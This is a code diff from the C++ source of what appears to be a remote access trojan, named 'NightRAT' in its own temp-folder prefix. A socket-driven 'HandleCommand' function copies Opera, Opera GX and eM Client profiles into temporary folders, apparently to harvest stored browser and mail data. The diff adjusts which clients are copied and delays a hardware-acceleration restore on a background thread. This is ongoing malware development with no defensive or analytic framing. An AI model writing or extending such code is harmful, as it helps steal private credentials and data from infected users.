@@ -2394,15 +2394,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX" || wRequestedPath == L"eM Client")) {
+                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
                         tempProfileRoot += L"NightRAT_";
                         if (wRequestedPath == L"Opera GX") {
                             tempProfileRoot += L"operagx";
-                        } else if (wRequestedPath == L"eM Client") {
-                            tempProfileRoot += L"emclient";
                         } else {
                             tempProfileRoot += exeName;
                         }
@@ -2565,7 +2563,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     }
 
                     if (wRequestedPath == L"eM Client") {
-                        restore_hw_acceleration();
+                        thread([]() {
+                            this_thread::sleep_for(chrono::milliseconds(3000));
+                            restore_hw_acceleration();
+                        }).detach();
                     }
 
                     if (isGecko) {
